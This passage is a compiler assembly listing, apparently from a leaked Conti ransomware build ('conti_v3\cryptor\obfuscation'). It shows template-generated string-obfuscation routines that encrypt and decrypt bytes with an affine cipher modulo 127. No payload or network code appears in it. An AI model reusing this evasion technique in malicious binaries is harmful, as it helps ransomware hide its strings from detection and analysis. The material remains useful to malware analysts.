	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00911	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00915	88 85 c0 00 00
	00		 mov	 BYTE PTR tv476[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0091b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00922	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00929	5f		 pop	 rdi
  0092a	5d		 pop	 rbp
  0092b	c3		 ret	 0
??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 63	 sub	 eax, 99			; 00000063H
  0002d	6b c0 e5	 imul	 eax, eax, -27
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2f	 imul	 eax, eax, 47		; 0000002fH
  0002d	83 c0 63	 add	 eax, 99			; 00000063H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
